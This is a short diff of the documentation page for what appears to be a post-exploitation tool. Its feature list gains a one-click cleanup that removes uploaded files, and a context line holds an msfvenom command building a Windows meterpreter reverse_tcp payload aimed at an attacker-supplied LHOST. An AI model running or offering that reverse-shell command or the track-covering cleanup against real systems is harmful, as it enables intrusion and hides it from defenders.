@@ -20,7 +20,7 @@ venom.exe : <code>sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=(ATTACK
 <li>One click user info/ user permissions info</li>
 <li>One click systeminfo</li>
 <li>One Click processes list</li>
-<li>And many more...</li>
+<li>One click file cleanup removes all files uploaded with this tool</li>
 </ul>
 
 <h2>How to use it</h2>
